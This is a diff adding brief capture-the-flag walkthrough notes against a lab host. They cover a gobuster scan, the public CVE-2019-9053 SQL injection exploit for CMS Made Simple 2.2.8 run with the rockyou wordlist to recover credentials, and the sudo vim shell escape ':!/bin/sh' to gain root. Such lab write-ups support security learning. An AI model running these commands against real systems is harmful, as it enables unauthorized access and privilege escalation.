@@ -1,0 +1,13 @@
+- Gobuster for port 80: gobuster dir -u http://10.201.8.54:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+- You'll find /simple
+- On website: CMS Made Simple version 2.2.8 Find its exploit
+- SQLi & CVE-2019–9053
+- Got exploit from exploit-db: https://www.exploit-db.com/exploits/46635 and copied it in a .py file using nano
+- command: python2 exploit.py -u http://10.201.8.54/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+- Password found: secret
+- Username found: mitch (keep in mind all these are the exploit.py's run result)
+- sudo -l to see what i can leverage for priv esc
+- /usr/bin/vim for priv esc
+- on gtfo bins for vim: sudo vim -c ':!/bin/sh
+- AND YOURE IN now cd /root and cat the flag
+
